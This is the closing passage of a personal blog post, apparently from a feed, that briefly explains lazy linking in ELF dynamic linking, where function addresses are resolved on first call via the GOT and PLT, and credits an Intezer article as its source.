<h3 id="lazy-linking">Lazy Linking</h3>

<p>Oops ! did I say that the linker performs all relocations. Well, thats not the case for most situations. This is where lazy linking comes into picture. So if a function is called then the dynamic linker will resolve the address for the function. Hence the name “Lazy” Linking. This awesome work is done by the GOT and PLT. (Next blog)</p>

<h2 id="end">END</h2>
<p>Good now that you understand some parts of Dynamic and Static linkning !!</p>

<h2 id="source">source:</h2>
<p>Really cool blog which made me understand this concept.
<a href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-4-dynamic-linking/">intezer</a></p>]]></content><author><name>tourpran</name></author><category term="Blogs" /><category term="dynamic" /><category term="static" /><category term="linkning" /><summary type="html"><![CDATA[start:]]></summary></entry></feed>